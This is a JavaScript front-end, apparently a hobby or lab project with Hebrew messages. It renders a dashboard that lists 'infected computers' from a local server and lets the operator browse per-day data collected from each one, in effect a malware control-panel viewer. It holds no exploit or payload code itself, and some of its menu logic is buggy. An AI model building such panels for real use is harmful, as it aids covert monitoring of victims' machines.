// פונקציה לעדכון השעון
function updateClock() {
    const clock = document.getElementById("clock");
    const now = new Date();
    const hours = now.getHours().toString().padStart(2, "0");
    const minutes = now.getMinutes().toString().padStart(2, "0");
    const seconds = now.getSeconds().toString().padStart(2, "0");
    clock.textContent = `${hours}:${minutes}:${seconds}`;
}

// התחלת שעון עם עדכון כל שניה
function startClock() {
    updateClock();
    setInterval(updateClock, 1000);
}

// פונקציות עזר להצגת והסתרת אלמנטים
function hideElements(elements) {
    elements.forEach(element => element.style.display = 'none');
}

function showElements(elements) {
    elements.forEach(element => element.style.display = 'block');
}

// פונקציה להצגת הודעה עם אפקט הקלדה
async function showMessage(message, container) {
    return new Promise(resolve => {
        typeMessageEffect(message, container);
        setTimeout(resolve, message.length * 50);
    });
}

// פונקציה לעיכוב
function wait(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// שליפת נתוני מחשבים נגועים מהשרת
async function fetchMachineNamesFromServer(container) {
    await showMessage("מחברים אותך לשרת... חכה שנייה, אנחנו כמעט שם!", container);
    await wait(2000);
    try {
        const response = await fetch('http://127.0.0.1:5000/get_machine_name');
        const data = await response.json();

        await showMessage("החיבור לשרת בוצע בהצלחה.", container);

        if (data.names && data.names.length > 0) {
            await wait(2000); // המתן 4 שניות לפני הצגת הודעה
            await showMessage("נמצאו מחשבים נגועים. הנתונים יוצגו כעת.", container);
            createComputersMenu(data.names, container);
            await wait(2000); // המתן 4 שניות לפני הצגת הודעה
            await showMessage("אנא בחר מחשב.", container);

        } else {
            await wait(4000); // המתן 4 שניות לפני הצגת הודעה
            await showMessage("לא נמצאו מחשבים נגועים בשלב זה.", container);
        }
    } catch (error) {
        console.error("Error fetching machine name:", error);
        await wait(4000); // המתן 4 שניות לפני הצגת הודעה על שגיאה
        await showMessage("נראה שיש בעיה בהתחברות לשרת. אנא נסה שוב מאוחר יותר.", container);
    }
}

async function fetchDataFromServer(container, machine_names) {
    await showMessage(`המחשב "${machine_names}" נבחר. מבצע התחברות לשרת...`, container);

    try {
    const response = await fetch(`http://127.0.0.1:5000/get_day_list/${machine_names}`);
        const data = await response.json();

        await wait(2000);
        await showMessage("החיבור לשרת הושלם בהצלחה.", container);

        if (data && Object.keys(data).length > 0) {
            await wait(4000);
            await showMessage(`נתונים עבור המחשב "${machine_names}" נמצאו. מציג את הנתונים כעת...`, container);
            createFilesMenu(container, data);
            await wait(2000);
            await showMessage("איזה נתון תרצה להציג?", container);
        } else {
            await wait(4000);
            await showMessage(`לא נמצאו נתונים עבור המחשב "${machine_names}".`, container);
        }
    } catch (error) {
        console.error("שגיאה בעת שליפת נתוני המחשב:", error);
        await wait(4000);
        await showMessage("אירעה תקלה בעת ההתחברות לשרת. אנא נסה שוב מאוחר יותר.", container);
    }
}


function createFilesMenu(container, data) {
    // יצירת קונטיינר לתפריט הקבצים
    const menuFiles = document.createElement("div");
    menuFiles.classList.add("menu-erea", "menu-files");

    // יצירת קונטיינר לכפתורים
    const buttonsContainer = document.createElement("div");
    buttonsContainer.classList.add("buttons-container");

    // יצירת כפתור לכל יום במערך
    data.days.forEach(day => {
        const button = document.createElement("button");
        button.textContent = day;
        button.classList.add("menu-button");

        // הגדרת אירוע לחיצה לכל כפתור
        button.onclick = () => fetchDataFromServer(container, day);

        // הוספת הכפתור לקונטיינר
        buttonsContainer.appendChild(button);
    });

    // הוספת קונטיינר הכפתורים לתפריט
    menuFiles.appendChild(buttonsContainer);
    
    // הוספת תפריט הקבצים לקונטיינר הראשי
    container.appendChild(menuFiles);
}


function createComputersMenu(buttonNames, container) {
    const buttonsContainer = document.createElement("div");
    buttonsContainer.classList.add("menu-erea", "menu-computers"); // הוספתי גם את המחלקה "menu-computers"

    buttonNames.forEach(name => {
        const button = document.createElement("button");
        button.textContent = name;
        button.classList.add("menu-button");

        button.onclick = () => fetchDataFromServer(container, name);

        buttonsContainer.appendChild(button);
    });

    container.appendChild(buttonsContainer);
}



// אפקט הקלדה להודעות
function typeMessageEffect(message, container) {
    const messageElement = document.createElement('p');
    messageElement.classList.add('message');
    container.appendChild(messageElement);

    let i = 0;
    function typeCharacter() {
        if (i < message.length) {
            messageElement.textContent = message.slice(0, i + 1);
            i++;
            setTimeout(typeCharacter, 50);
        }
    }
    typeCharacter();
}

// אתחול הדף בעת טעינה
document.addEventListener('DOMContentLoaded', async function() {
    const backgroundVideo = document.getElementById('background-video');
    const loginMessage = document.querySelector('.login-message');
    const username = localStorage.getItem('username');
    const usernameDiv = document.getElementById('username');
    usernameDiv.textContent = `🔒${username}`;
    const clock = document.getElementById('clock');
    const messageContainer = document.getElementById('message-container');
    const menuFiles = document.getElementById('menu-files');
    const menuComputers = document.getElementById('menu-computers');  

    startClock();

    hideElements([usernameDiv, clock, messageContainer]);
    await showElements([loginMessage]);

    await wait(3000);

    showElements([backgroundVideo, clock, usernameDiv, messageContainer]);
    hideElements([loginMessage]);

    await showMessage(`ברוך הבא, ${username}!`, messageContainer);
    await wait(2000);
    await fetchMachineNamesFromServer(messageContainer);
});
